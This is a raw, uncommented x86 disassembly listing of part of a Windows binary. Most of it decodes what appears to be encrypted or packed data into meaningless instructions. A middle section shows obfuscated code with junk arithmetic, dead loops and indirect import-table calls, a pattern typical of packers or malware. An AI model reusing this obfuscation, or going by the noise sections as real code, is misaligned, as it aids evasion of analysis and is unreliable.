  40ef3e:	lahf   
  40ef3f:	dec    ebx
  40ef40:	enter  0xc59,0x73
  40ef44:	mov    al,ds:0x6c5c18e5
  40ef49:	or     al,0x9
  40ef4b:	adc    al,0x59
  40ef4d:	out    0x8f,al
  40ef4f:	jmp    0xe807:0x3aef9a45
  40ef56:	push   ss
  40ef57:	leave  
  40ef58:	push   cs
  40ef59:	dec    ebp
  40ef5a:	fld    TBYTE PTR [esp+ecx*4]
  40ef5d:	push   esp
  40ef5e:	pop    ss
  40ef5f:	pop    esp
  40ef60:	rcr    dh,0x45
  40ef63:	jno    0x40ef45
  40ef65:	push   ecx
  40ef66:	push   ebp
  40ef67:	lahf   
  40ef68:	loope  0x40ef61
  40ef6a:	test   DWORD PTR ds:0x707f3d9c,0xe6d4c4e1
  40ef74:	rcl    DWORD PTR [esi+0x3eaabe83],0xbe
  40ef7b:	shr    ebp,0x62
  40ef7e:	mov    dl,al
  40ef80:	(bad)  
  40ef81:	sbb    al,0xed
  40ef83:	mov    cl,0xb8
  40ef85:	loop   0x40ef45
  40ef87:	dec    ebp
  40ef88:	into   
  40ef89:	sbb    eax,0xdb936175
  40ef8e:	cld    
  40ef8f:	mov    esp,0x30ff24bd
  40ef94:	push   esp
  40ef95:	push   cs
  40ef96:	pop    ss
  40ef97:	xor    DWORD PTR [edx-0x676e5b9d],0xffffff86
  40ef9e:	adc    al,0x86
  40efa0:	jbe    0x40ef8c
  40efa2:	sbb    al,0xc4
  40efa4:	and    al,0x2a
  40efa6:	sub    BYTE PTR [edi],ah
  40efa8:	jb     0x40ef51
  40efaa:	or     eax,0xfde2266
  40efaf:	stos   BYTE PTR es:[edi],al
  40efb0:	mov    al,ds:0x2ec3d853
  40efb5:	out    0xdb,eax
  40efb7:	nop
  40efb8:	add    BYTE PTR gs:[edi+0x37],dl
  40efbc:	jnp    0x40efb4
  40efbe:	jnp    0x40f02b
  40efc0:	in     al,dx
  40efc1:	add    eax,0xbfd5dc33
  40efc6:	mov    al,ds:0x1122140c
  40efcb:	jg     0x40efaa
  40efcd:	cli    
  40efce:	or     BYTE PTR [edi-0x4],dh
  40efd1:	sahf   
  40efd2:	js     0x40f03b
  40efd4:	push   ebp
  40efd5:	ss pop es
  40efd7:	dec    esi
  40efd8:	sbb    ecx,eax
  40efda:	add    al,0xf
  40efdc:	sub    DWORD PTR [edi+0xf12398e],0xeb32b4f2
  40efe6:	dec    ebp
  40efe7:	dec    esp
  40efe8:	xchg   ecx,eax
  40efe9:	push   ebp
  40efeb:	into   
  40efec:	outs   dx,BYTE PTR ds:[esi]
  40efed:	fild   WORD PTR [ebx+0x735b1004]
  40eff3:	neg    BYTE PTR [esi+edx*4+0x60]
  40eff7:	dec    ecx
  40eff8:	lock iret 
  40effa:	cld    
  40effb:	mov    ebx,0xd9f1f7eb
  40f000:	pop    ds
  40f001:	test   DWORD PTR [esi+edx*2-0x4d],ecx
  40f005:	sub    BYTE PTR [esi+0x6c],al
  40f008:	and    DWORD PTR [edi+ebp*4+0x47eff9a7],0x8748d992
  40f013:	inc    edx
  40f014:	xchg   ecx,eax
  40f015:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f016:	stos   DWORD PTR es:[edi],eax
  40f017:	iret   
  40f018:	xor    esp,DWORD PTR [eax+0x4df01d99]
  40f01e:	call   0xc712b94e
  40f023:	dec    esi
  40f024:	gs push 0xfbba66fa
  40f02a:	xor    ecx,esp
  40f02c:	xchg   ebx,eax
  40f02d:	jno    0x40eff6
  40f02f:	mov    cl,0x57
  40f031:	dec    esi
  40f032:	test   eax,0xafeaeebd
  40f037:	daa    
  40f038:	xchg   edx,eax
  40f039:	jno    0x40f00f
  40f03b:	outs   dx,DWORD PTR ds:[esi]
  40f03c:	mov    bh,0x7f
  40f03e:	pop    eax
  40f03f:	adc    BYTE PTR [eax],0x2f
  40f042:	inc    esp
  40f043:	pop    edx
  40f044:	push   esp
  40f045:	iret   
  40f046:	sbb    esi,DWORD PTR [edx-0x13ce9242]
  40f04c:	push   eax
  40f04d:	lahf   
  40f04e:	arpl   WORD PTR [eax-0x531c58d3],sp
  40f054:	add    al,BYTE PTR [ecx]
  40f056:	xchg   esi,eax
  40f057:	mov    al,0x4
  40f059:	out    dx,eax
  40f05a:	dec    edx
  40f05b:	add    BYTE PTR [edx],ah
  40f05d:	push   cs
  40f05e:	aaa    
  40f05f:	mov    ch,0x5c
  40f061:	lea    esp,ss:[edx+0x2f00a833]
  40f068:	ret    0x8500
  40f06b:	add    eax,0x8e6c26d1
  40f070:	mov    ds:0xe804fc7a,al
  40f075:	push   ecx
  40f076:	loop   0x40f0ba
  40f078:	in     eax,dx
  40f079:	outs   dx,BYTE PTR ds:[esi]
  40f07a:	call   0x7d0a:0x5e38467f
  40f081:	xor    dh,BYTE PTR [edx]
  40f083:	pushf  
  40f084:	iret   
  40f085:	and    cl,BYTE PTR [edi-0x58]
  40f088:	push   edx
  40f089:	fld    QWORD PTR [eax]
  40f08b:	stos   BYTE PTR es:[edi],al
  40f08c:	add    ah,BYTE PTR ds:0x19d4d7e0
  40f092:	push   eax
  40f093:	jg     0x40f0ad
  40f095:	sub    eax,0x25e49fe9
  40f09a:	les    ecx,FWORD PTR [ecx+0x13]
  40f09d:	mov    cs:0x60a250a5,eax
  40f0a3:	add    ebx,eax
  40f0a5:	aad    0x9
  40f0a7:	(bad)  
  40f0a8:	cs add dl,bl
  40f0ab:	xchg   ebp,eax
  40f0ac:	cli    
  40f0ad:	jg     0x40f0e0
  40f0af:	mov    BYTE PTR [esi-0x35],cl
  40f0b2:	sti    
  40f0b3:	test   al,0xa1
  40f0b5:	jnp    0x40f0f2
  40f0b7:	clc    
  40f0b8:	in     eax,0x4c
  40f0ba:	mov    ecx,0x263cc5b5
  40f0bf:	loope  0x40f11e
  40f0c1:	cdq    
  40f0c2:	outs   dx,BYTE PTR ds:[esi]
  40f0c3:	mov    esi,0x10cd1320
  40f0c8:	fsubr  st(7),st
  40f0ca:	pop    edi
  40f0cb:	dec    ebx
  40f0cc:	aas    
  40f0cd:	jmp    0x75d:0x62947842
  40f0d4:	sbb    bh,dh
  40f0d6:	pop    esi
  40f0d7:	push   ss
  40f0d8:	mov    WORD PTR [edx-0x70],?
  40f0db:	push   0xd44a98dd
  40f0e0:	in     al,0x77
  40f0e2:	mov    bl,0xab
  40f0e4:	jmp    0x316402cf
  40f0e9:	mov    ecx,DWORD PTR [ebx-0x7f]
  40f0ec:	test   cl,cl
  40f0ee:	(bad)  
  40f0ef:	mov    dh,0x8
  40f0f1:	sti    
  40f0f2:	(bad)  
  40f0f3:	xchg   esi,eax
  40f0f4:	push   ss
  40f0f5:	inc    esp
  40f0f6:	xlat   BYTE PTR ds:[ebx]
  40f0f7:	and    edi,esp
  40f0f9:	pop    ecx
  40f0fa:	shr    DWORD PTR [eax-0x2e0a99e4],1
  40f100:	pop    eax
  40f101:	imul   edx,DWORD PTR [eax+0x60],0xffffffd6
  40f105:	fdivr  DWORD PTR cs:[edi+0x15]
  40f109:	call   0x7750:0xd9856d23
  40f110:	fimul  WORD PTR [eax+0x22]
  40f113:	pop    ecx
  40f114:	sahf   
  40f115:	popf   
  40f116:	mov    al,ds:0x6b451535
  40f11b:	loope  0x40f18d
  40f11d:	mov    eax,ds:0xca012e42
  40f122:	fidiv  DWORD PTR [ecx-0x60cc0d1e]
  40f128:	icebp  
  40f129:	mov    ah,0x86
  40f12b:	jns    0x40f10b
  40f12d:	call   0x21a7ccae
  40f132:	js     0x40f190
  40f134:	jne    0x40f0fa
  40f136:	adc    dl,ch
  40f138:	xchg   esp,eax
  40f139:	push   eax
  40f13a:	cmp    dl,BYTE PTR [ecx+0x47151b28]
  40f140:	add    bl,BYTE PTR [edi-0x3a]
  40f143:	mov    ebp,DWORD PTR [esi+0x44]
  40f146:	dec    edx
  40f147:	sar    esi,1
  40f149:	dec    esi
  40f14a:	mov    ds:0xf9cd99e6,al
  40f14f:	les    edx,FWORD PTR [edx+0x7d41ab13]
  40f155:	jl     0x40f16f
  40f157:	ds retf 0x4370
  40f15b:	mov    edx,0x9f244641
  40f160:	pop    ebp
  40f161:	into   
  40f162:	call   0x2e800bca
  40f167:	aas    
  40f168:	mov    ah,0x64
  40f16a:	push   0xffffffe7
  40f16c:	fiadd  WORD PTR ds:0x6677cf49
  40f172:	out    dx,al
  40f173:	shl    DWORD PTR ds:0x82081260,0x34
  40f17a:	sbb    al,0x13
  40f17c:	adc    al,bh
  40f17e:	int3   
  40f17f:	mov    al,ds:0x9407f28d
  40f184:	cmp    esi,DWORD PTR [edx+0x30fa9f91]
  40f18a:	(bad)  
  40f18b:	shl    ebp,cl
  40f18d:	pushf  
  40f18e:	lock xchg esp,eax
  40f190:	aas    
  40f191:	fisttp QWORD PTR [edi]
  40f193:	repnz cs pop es
  40f196:	mov    ebx,0x7a0b1c3
  40f19b:	mov    edx,0x52aa055e
  40f1a0:	cli    
  40f1a1:	aad    0xb7
  40f1a3:	cmp    dl,dh
  40f1a5:	adc    DWORD PTR [ebx+0x68],eax
  40f1a8:	pop    eax
  40f1a9:	mov    DWORD PTR [eax+0x698530e5],ebp
  40f1af:	adc    al,0x57
  40f1b1:	cwde   
  40f1b2:	push   es
  40f1b3:	xchg   ecx,eax
  40f1b4:	push   ds
  40f1b5:	cwde   
  40f1b6:	mov    WORD PTR [edi],fs
  40f1b8:	add    eax,0x5be8b885
  40f1bd:	fld    QWORD PTR [ebp-0x1e7430a]
  40f1c3:	fdiv   DWORD PTR [ebp+0x4e]
  40f1c6:	or     BYTE PTR [ebp+0x7e73ad76],0x6c
  40f1cd:	jno    0x40f21d
  40f1cf:	sbb    ebx,ebx
  40f1d1:	inc    ebx
  40f1d2:	sbb    eax,DWORD PTR [di-0x6d]
  40f1d6:	jns    0x40f218
  40f1d8:	test   al,0x5e
  40f1db:	cmc    
  40f1dc:	push   ebp
  40f1dd:	inc    esi
  40f1de:	sbb    ecx,ecx
  40f1e0:	neg    BYTE PTR [ebp+ecx*1-0x6c]
  40f1e4:	xor    eax,0x1c137c04
  40f1e9:	loop   0x40f244
  40f1eb:	pop    edx
  40f1ec:	jae    0x40f211
  40f1ee:	mov    esi,0x65897612
  40f1f3:	cmp    edx,DWORD PTR [esi+0x61]
  40f1f6:	shl    eax,0x1e
  40f1f9:	dec    edx
  40f1fa:	sub    BYTE PTR [ebp+0x6a],dl
  40f1fd:	sbb    ecx,DWORD PTR [ecx]
  40f1ff:	dec    edi
  40f200:	and    al,0xc5
  40f202:	mov    ebp,DWORD PTR [ebp+ebp*8-0xc]
  40f206:	jae    0x40f19a
  40f208:	retf   0xe809
  40f20b:	push   DWORD PTR [esp]
  40f20e:	xchg   DWORD PTR [ecx+edi*4+0x5a],ebx
  40f212:	ret    
  40f213:	jmp    0x467ae480
  40f218:	jb     0x40f1da
  40f21a:	or     ebp,DWORD PTR [ebx+0x702b3655]
  40f220:	inc    edi
  40f221:	sub    BYTE PTR [edx],bh
  40f223:	push   esi
  40f224:	xchg   DWORD PTR [edi],ecx
  40f226:	cmp    BYTE PTR [si],ch
  40f229:	cmp    ecx,esi
  40f22b:	outs   dx,BYTE PTR ds:[esi]
  40f22c:	std    
  40f22d:	push   edi
  40f22e:	sbb    cl,BYTE PTR [eax+eax*4]
  40f231:	fild   DWORD PTR [ecx+0x5a613269]
  40f237:	mov    bl,BYTE PTR [ebp+0x55]
  40f23a:	inc    ecx
  40f23b:	leave  
  40f23c:	xor    eax,0x7dbf09bc
  40f241:	mov    ds:0x586e0c9c,eax
  40f246:	mov    eax,ds:0x4ab368dc
  40f24b:	jmp    FWORD PTR [ebx+0x2]
  40f24e:	sbb    DWORD PTR [eax],eax
  40f250:	test   al,0x4d
  40f252:	adc    ecx,DWORD PTR ds:[edx+edi*2+0x54]
  40f257:	pusha  
  40f258:	mov    ebx,ebx
  40f25a:	adc    DWORD PTR [ebx-0x3d],ecx
  40f25d:	(bad)  
  40f25e:	cmp    eax,0xc3c2ef0e
  40f263:	out    dx,eax
  40f264:	adc    esi,DWORD PTR [ebx-0x393db211]
  40f26a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f26b:	or     DWORD PTR [ebp+ebp*8-0x247acf30],0x3d
  40f273:	int3   
  40f274:	adc    bh,BYTE PTR [ebx+0x4e]
  40f277:	lds    edi,FWORD PTR [eax]
  40f279:	inc    eax
  40f27a:	xchg   edx,eax
  40f27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f27c:	pop    DWORD PTR [ebp+0x71fe3ff6]
  40f282:	xor    BYTE PTR [ebx],dh
  40f284:	xchg   edi,eax
  40f285:	ficom  DWORD PTR [edx-0x4b7d294e]
  40f28b:	in     eax,0x21
  40f28d:	js     0x40f237
  40f28f:	dec    esi
  40f290:	push   ds
  40f291:	leave  
  40f292:	push   edx
  40f293:	jno    0x40f283
  40f295:	push   eax
  40f296:	scas   eax,DWORD PTR es:[edi]
  40f297:	or     DWORD PTR [ecx+0x74efeb48],ecx
  40f29d:	sti    
  40f29e:	ins    BYTE PTR es:[edi],dx
  40f29f:	mov    ebx,0xd5ae7123
  40f2a4:	jecxz  0x40f30b
  40f2a6:	imul   edx,ecx,0x40
  40f2a9:	dec    edi
  40f2aa:	push   edx
  40f2ab:	bound  ebp,QWORD PTR [esi]
  40f2ad:	push   ds
  40f2ae:	aaa    
  40f2af:	mov    esi,ebx
  40f2b1:	inc    ecx
  40f2b2:	ret    0xcb7f
  40f2b5:	push   ebx
  40f2b6:	test   BYTE PTR [eax-0x7a],0x14
  40f2ba:	inc    ebx
  40f2bb:	mov    esi,0x81bd832a
  40f2c0:	dec    ebp
  40f2c1:	loopne 0x40f28a
  40f2c3:	lds    edi,FWORD PTR [eax-0x46]
  40f2c6:	imul   eax,eax,0x34
  40f2c9:	mov    esp,0xcdc26a65
  40f2ce:	cmp    DWORD PTR [ecx+0x6916c444],esp
  40f2d4:	mov    ecx,0x42d2749b
  40f2d9:	mov    eax,0x91ea5651
  40f2de:	sbb    al,0xd0
  40f2e0:	pop    esi
  40f2e1:	call   DWORD PTR [edi]
  40f2e3:	mov    ch,0x4a
  40f2e5:	mov    ecx,0xbaab9c33
  40f2ea:	adc    al,0xb6
  40f2ec:	push   ds
  40f2ed:	jge    0x40f36b
  40f2ef:	int3   
  40f2f0:	and    al,0x22
  40f2f2:	jge    0x40f2f1
  40f2f4:	push   0x9
  40f2f6:	push   es
  40f2f7:	jmp    0x87a01d28
  40f2fc:	jno    0x40f2d9
  40f2fe:	add    DWORD PTR [edi-0x48f88c9e],ebx
  40f304:	push   ss
  40f305:	lahf   
  40f306:	jge    0x40f2d1
  40f308:	(bad)  
  40f309:	xchg   esi,eax
  40f30a:	shl    DWORD PTR [ecx],cl
  40f30c:	dec    esp
  40f30d:	and    edi,edx
  40f30f:	pop    esp
  40f310:	jne    0x40f35a
  40f312:	es jl  0x40f390
  40f315:	mov    esp,0xab14e962
  40f31a:	sub    BYTE PTR [edi+0x4],al
  40f31d:	pop    eax
  40f31e:	enter  0x62db,0xaf
  40f322:	jo     0x40f2de
  40f324:	mov    eax,ds:0x1a45cd5b
  40f329:	pop    ebp
  40f32a:	scas   eax,DWORD PTR es:[edi]
  40f32b:	or     DWORD PTR [ebp+edi*4-0x7b],ebx
  40f32f:	ret    
  40f330:	test   DWORD PTR [edx-0x4409253c],eax
  40f336:	pop    ebx
  40f337:	psrlw  mm7,QWORD PTR [edx-0x44]
  40f33b:	scas   al,BYTE PTR es:[edi]
  40f33c:	ficom  DWORD PTR [edi*8-0x2c67c38c]
  40f343:	xor    BYTE PTR [edi],cl
  40f345:	jg     0x40f383
  40f347:	ins    BYTE PTR es:[edi],dx
  40f348:	hlt    
  40f349:	into   
  40f34a:	adc    al,0xb4
  40f34c:	push   eax
  40f34d:	add    BYTE PTR [ebp-0x35949e04],ah
  40f353:	add    edx,edi
  40f355:	or     DWORD PTR ds:0x434004,0x43601c
  40f35f:	and    edx,ebx
  40f361:	mov    DWORD PTR [ebp-0x4c],edx
  40f364:	sbb    ebx,edx
  40f366:	mov    edx,DWORD PTR [ebp+0x8]
  40f369:	and    ebx,DWORD PTR ds:0x436000
  40f36f:	mov    ebx,DWORD PTR [ebp-0x48]
  40f372:	and    DWORD PTR ds:0x434008,0x438000
  40f37c:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f383:	movzx  ebx,BYTE PTR ds:0x437010
  40f38a:	and    DWORD PTR ds:0x438004,ebx
  40f390:	mov    DWORD PTR [ebp-0x48],edx
  40f393:	and    ebx,DWORD PTR ds:0x43501c
  40f399:	mov    edx,DWORD PTR [ebp+0x8]
  40f39c:	mov    ebx,0xfa5e15e2
  40f3a1:	sub    ebx,edx
  40f3a3:	or     DWORD PTR ds:0x43801c,0x224f
  40f3ad:	add    ebx,DWORD PTR [ebp-0x44]
  40f3b0:	mov    DWORD PTR [ebp-0x44],ebx
  40f3b3:	mov    edx,DWORD PTR [ebp+0x8]
  40f3b6:	xor    edx,eax
  40f3b8:	or     DWORD PTR ds:0x43801c,0x42c8
  40f3c2:	add    edx,esi
  40f3c4:	mov    DWORD PTR ds:0x434008,0x7004
  40f3ce:	jne    0x40ab4e
  40f3d4:	jmp    0x4163dd
  40f3d9:	mov    DWORD PTR ds:0x438008,0x1c
  40f3e3:	cmp    DWORD PTR ds:0x438008,0x0
  40f3ea:	je     0x40f448
  40f3f0:	cmp    DWORD PTR ds:0x438008,0x4
  40f3f7:	jl     0x40f448
  40f3fd:	jmp    0x40f41a
  40f402:	push   DWORD PTR [ebp-0x24]
  40f405:	push   0x3847
  40f40a:	push   0x753d
  40f40f:	push   0x26fc
  40f414:	call   DWORD PTR ds:0x43a8e8
  40f41a:	cmp    DWORD PTR ds:0x438008,0x5
  40f421:	jne    0x40f436
  40f427:	xor    edx,edx
  40f429:	xor    edx,DWORD PTR ds:0x438008
  40f42f:	dec    edx
  40f430:	mov    DWORD PTR ds:0x438008,edx
  40f436:	mov    edx,DWORD PTR ds:0x438008
  40f43c:	dec    edx
  40f43d:	mov    DWORD PTR ds:0x438008,edx
  40f443:	jmp    0x40f3e3
  40f448:	mov    edx,DWORD PTR [ebp-0xc]
  40f44b:	neg    DWORD PTR ds:0x434004
  40f451:	sub    edx,esi
  40f453:	xor    edx,eax
  40f455:	mov    DWORD PTR [ebp-0x5c],edx
  40f458:	mov    edx,DWORD PTR [ebp-0x10]
  40f45b:	mov    ebx,DWORD PTR [ebp-0x8]
  40f45e:	or     DWORD PTR ds:0x438018,0x434020
  40f468:	xor    edx,eax
  40f46a:	xor    ebx,eax
  40f46c:	adc    DWORD PTR ds:0x438000,0x7999
  40f476:	sub    edx,ebx
  40f478:	and    DWORD PTR ds:0x43500c,0x6f6
  40f482:	sub    edx,esi
  40f484:	xor    edx,eax
  40f486:	mov    DWORD PTR [ebp-0x10],edx
  40f489:	mov    DWORD PTR ds:0x435000,0x69ba
  40f493:	mov    edx,DWORD PTR [ebp-0x14]
  40f496:	mov    DWORD PTR ds:0x436008,0x7efb
  40f4a0:	mov    DWORD PTR [ebp+0x8],edx
  40f4a3:	jmp    0x40f6a5
  40f4a8:	mov    DWORD PTR ds:0x434000,0x12
  40f4b2:	cmp    DWORD PTR ds:0x434000,0x0
  40f4b9:	je     0x40f505
  40f4bf:	cmp    DWORD PTR ds:0x434000,0x4
  40f4c6:	jb     0x40f505
  40f4cc:	jmp    0x40f4d7
  40f4d1:	call   DWORD PTR ds:0x43a8f0
  40f4d7:	cmp    DWORD PTR ds:0x434000,0x5
  40f4de:	jne    0x40f4f3
  40f4e4:	xor    edx,edx
  40f4e6:	xor    edx,DWORD PTR ds:0x434000
  40f4ec:	dec    edx
  40f4ed:	mov    DWORD PTR ds:0x434000,edx
  40f4f3:	mov    edx,DWORD PTR ds:0x434000
  40f4f9:	dec    edx
  40f4fa:	mov    DWORD PTR ds:0x434000,edx
  40f500:	jmp    0x40f4b2
  40f505:	mov    edx,DWORD PTR [ebp+0x8]
  40f508:	mov    ebx,DWORD PTR [ebp-0x8]
  40f50b:	adc    DWORD PTR ds:0x436008,0x434014
  40f515:	xor    edx,eax
  40f517:	sub    DWORD PTR ds:0x438010,0x434018
  40f521:	xor    ebx,eax
  40f523:	sub    edx,ebx
  40f525:	sub    edx,esi
  40f527:	and    DWORD PTR ds:0x437014,0x0
  40f531:	mov    ebx,DWORD PTR ds:0x437014
  40f537:	inc    ebx
  40f538:	mov    DWORD PTR ds:0x437014,ebx
  40f53e:	cmp    DWORD PTR ds:0x437014,0x4
  40f545:	jge    0x40f582
  40f54b:	jmp    0x40f55b
  40f550:	push   0x7690
  40f555:	call   DWORD PTR ds:0x43a8f4
  40f55b:	cmp    DWORD PTR ds:0x437014,0x3
  40f562:	jne    0x40f575
  40f568:	mov    ebx,DWORD PTR ds:0x437014
  40f56e:	inc    ebx
  40f56f:	mov    DWORD PTR ds:0x437014,ebx
  40f575:	cmp    DWORD PTR ds:0x437014,0x1b
  40f57c:	jb     0x40f531
  40f582:	xor    edx,eax
  40f584:	movzx  ebx,WORD PTR ds:0x435010
  40f58b:	adc    DWORD PTR ds:0x434020,ebx
  40f591:	mov    DWORD PTR [ebp+0x8],edx
  40f594:	and    DWORD PTR ds:0x435018,0x0
  40f59e:	jmp    0x40f5b0
  40f5a3:	mov    edx,DWORD PTR ds:0x435018
  40f5a9:	inc    edx
  40f5aa:	mov    DWORD PTR ds:0x435018,edx
  40f5b0:	cmp    DWORD PTR ds:0x435018,0x18
  40f5b7:	jae    0x40f5e4
  40f5bd:	cmp    DWORD PTR ds:0x435018,0x22
  40f5c4:	jbe    0x40f5e4
  40f5ca:	jmp    0x40f5df
  40f5cf:	push   0x6f28
  40f5d4:	push   0x4b78
  40f5d9:	call   DWORD PTR ds:0x43a8f8
  40f5df:	jmp    0x40f5a3
  40f5e4:	mov    edx,DWORD PTR [ebp+0x8]
  40f5e7:	sbb    DWORD PTR ds:0x434004,edx
  40f5ed:	mov    ebx,DWORD PTR [ebp-0x58]
  40f5f0:	add    edx,0x5708c4
  40f5f6:	adc    DWORD PTR ds:0x437004,0x434004
  40f600:	imul   edx,ebx
  40f603:	mov    ebx,DWORD PTR ds:0x43701c
  40f609:	adc    DWORD PTR ds:0x43801c,ebx
  40f60f:	mov    DWORD PTR [ebp-0x58],edx
  40f612:	mov    edx,DWORD PTR [ebp+0x8]
  40f615:	xor    DWORD PTR ds:0x435010,edx
  40f61b:	mov    ebx,DWORD PTR [ebp-0x54]
  40f61e:	adc    DWORD PTR ds:0x43600c,0x437010
  40f628:	add    edx,0x64f8da
  40f62e:	or     edx,ebx
  40f630:	mov    DWORD PTR [ebp-0x54],edx
  40f633:	mov    edx,DWORD PTR [ebp+0x8]
  40f636:	adc    ebx,DWORD PTR ds:0x436014
  40f63c:	mov    ebx,DWORD PTR [ebp-0x50]
  40f63f:	add    edx,ecx
  40f641:	adc    DWORD PTR ds:0x43401c,0x78dc
  40f64b:	xor    edx,ebx
  40f64d:	adc    DWORD PTR ds:0x437014,0x50e3
  40f657:	mov    DWORD PTR [ebp-0x50],edx
  40f65a:	adc    DWORD PTR ds:0x434008,0x291b
  40f664:	mov    edx,DWORD PTR [ebp+0x8]
  40f667:	mov    ebx,DWORD PTR [ebp-0x4c]
  40f66a:	and    DWORD PTR ds:0x438010,0x434004
  40f674:	add    edx,edi
  40f676:	add    DWORD PTR ds:0x436018,0x43800c
  40f680:	and    edx,ebx
  40f682:	mov    DWORD PTR [ebp-0x4c],edx
  40f685:	mov    edx,DWORD PTR [ebp+0x8]
  40f688:	mov    ebx,DWORD PTR [ebp-0x48]
  40f68b:	lea    edx,[ebx+edx*1+0x241fc1f]
  40f692:	mov    DWORD PTR [ebp-0x48],edx
  40f695:	mov    edx,DWORD PTR [ebp+0x8]
  40f698:	mov    ebx,0xfa5e15e2
  40f69d:	sub    ebx,edx
  40f69f:	add    ebx,DWORD PTR [ebp-0x44]
  40f6a2:	mov    DWORD PTR [ebp-0x44],ebx
  40f6a5:	mov    edx,DWORD PTR [ebp+0x8]
  40f6a8:	xor    edx,eax
  40f6aa:	add    edx,esi
  40f6ac:	jne    0x40f4a8
  40f6b2:	mov    edx,DWORD PTR [ebp-0xc]
  40f6b5:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6bc:	mov    bl,BYTE PTR [ebp-0x1]
  40f6bf:	cmp    dl,bl
  40f6c1:	je     0x411b53
  40f6c7:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6ca:	mov    edx,DWORD PTR [ebp-0xc]
  40f6cd:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  40f6d4:	mov    ebx,DWORD PTR [ebp+0xc]
  40f6d7:	xor    ecx,eax
  40f6d9:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272e2]
  40f6e0:	jne    0x4163ef
  40f6e6:	mov    ecx,DWORD PTR [ebp-0x5c]
  40f6e9:	mov    edx,DWORD PTR [ebp+0xc]
  40f6ec:	xor    ecx,eax
  40f6ee:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272e2]
  40f6f6:	jmp    0x411aaa
  40f6fb:	ficomp WORD PTR ds:0x81a319e0
  40f701:	xchg   DWORD PTR [ebx-0x12a5fb05],ebx
  40f707:	dec    ecx
  40f708:	mov    al,0x57
  40f70a:	ret    
  40f70b:	fmul   st(5),st
  40f70d:	jl     0x40f78b
  40f70f:	jmp    0x40f770
  40f711:	jl     0x40f78f
  40f713:	jl     0x40f6cb
  40f715:	sahf   
  40f716:	cmp    ah,bl
  40f718:	call   0xd35c3e8b
  40f71d:	fmul   DWORD PTR [ecx-0x75]
  40f720:	mov    dl,0xdd
  40f722:	adc    eax,0x2dd16e23
  40f727:	dec    ebx
  40f728:	cwde   
  40f729:	(bad)  
  40f72b:	loopne 0x40f764
  40f72d:	jge    0x40f6e2
  40f72f:	cmp    DWORD PTR [ecx+ecx*2],esp
  40f732:	test   al,0x7d
  40f734:	outs   dx,BYTE PTR ds:[esi]
  40f735:	mov    BYTE PTR [esi],dl
  40f737:	or     DWORD PTR [esi-0xe],esi
  40f73a:	mov    BYTE PTR ss:[esi-0x1475e560],ah
  40f741:	inc    ebx
  40f742:	dec    edx
  40f743:	es (bad) 
  40f745:	push   ebx
  40f746:	xchg   ebp,eax
  40f747:	sbb    eax,0xfa2d0e34
  40f74c:	out    dx,al
  40f74d:	shr    BYTE PTR [ecx],0xda
  40f750:	push   ds
  40f751:	imul   eax,eax,0xffffff82
  40f754:	(bad)  
  40f755:	cmp    al,BYTE PTR [ebp+0xf]
  40f758:	dec    ecx
  40f759:	shr    BYTE PTR [edi-0x2a],1
  40f75c:	lock retf 0x8a87
  40f760:	mov    WORD PTR [ebx+0x3e],es
  40f763:	es push es
  40f765:	clc    
  40f766:	outs   dx,BYTE PTR ds:[esi]
  40f767:	shl    DWORD PTR [ecx+eax*2-0x77c7dc8c],1
  40f76e:	and    dh,BYTE PTR [ebx+0xbee3d0c]
  40f774:	mov    al,ds:0xa0b28239
  40f779:	cli    
  40f77a:	in     al,0xdf
  40f77c:	fbstp  TBYTE PTR [eax+0x60]
  40f77f:	xchg   BYTE PTR [edi],ah
  40f781:	push   edx
  40f782:	sub    BYTE PTR [edi],dh
  40f784:	in     eax,dx
  40f785:	(bad)  
  40f786:	hlt    
  40f787:	pop    edx
  40f788:	and    al,BYTE PTR [esi+0x34614d6c]
  40f78e:	add    esi,DWORD PTR [eax]
  40f790:	cmp    bl,BYTE PTR [eax]
  40f792:	jp     0x40f742
  40f794:	and    al,0x5c
  40f796:	jg     0x40f74c
  40f798:	mov    DWORD PTR ds:0xcc2c5223,edx
  40f79e:	dec    ecx
  40f79f:	js     0x40f728
  40f7a1:	xor    BYTE PTR [ebp+0x3cfb4ae4],0xa2
  40f7a8:	push   eax
  40f7a9:	int3   
  40f7aa:	int    0xee
  40f7ac:	mov    ch,0x50
  40f7ae:	add    dh,BYTE PTR ds:0xef020570
  40f7b4:	test   BYTE PTR gs:[bp+di-0x341b],dh
  40f7ba:	and    esi,DWORD PTR [esi-0x4fde6bb2]
  40f7c0:	cwde   
  40f7c1:	adc    DWORD PTR [ebp+0x5a],edx
  40f7c4:	in     al,0x8e
  40f7c6:	pop    es
  40f7c7:	pop    DWORD PTR [edx-0x67]
  40f7ca:	push   cs
  40f7cb:	sub    eax,0xcd15bfe8
  40f7d0:	inc    esi
  40f7d1:	pop    ebp
  40f7d2:	cmc    
  40f7d3:	hlt    
  40f7d4:	test   al,0xc9
  40f7d6:	xchg   ebp,eax
  40f7d7:	ret    
  40f7d8:	and    DWORD PTR [edx-0x6d],0x805ca37a
  40f7df:	push   es
  40f7e0:	cmc    
  40f7e1:	mov    ds:0x5afa657,al
  40f7e6:	adc    ch,BYTE PTR [ecx-0x25]
  40f7e9:	push   edx
  40f7ea:	xor    DWORD PTR [ebx],0x5
  40f7ed:	sub    eax,0x2897cd19
  40f7f2:	sahf   
  40f7f3:	cmp    ebx,DWORD PTR ds:0x1c44a02c
  40f7f9:	xor    dl,BYTE PTR [ebx+esi*1-0x188fd52]
  40f800:	push   edi
  40f801:	xor    BYTE PTR [edx+0x5337065c],ch
  40f807:	mov    edi,0x710a30bc
  40f80c:	jmp    0x40f7d4
  40f80e:	cli    
  40f80f:	dec    eax
  40f810:	or     DWORD PTR [eax-0x17],ebp
  40f813:	sub    ebp,ebp
  40f815:	mov    ds,ebx
  40f817:	xor    eax,0xabfa9e6c
  40f81c:	(bad)  
  40f81d:	xor    dh,BYTE PTR [esp+ebx*4]
  40f820:	lods   al,BYTE PTR ds:[esi]
  40f821:	bound  edi,QWORD PTR [ebx-0x5]
  40f824:	jae    0x40f7fc
  40f826:	push   esp
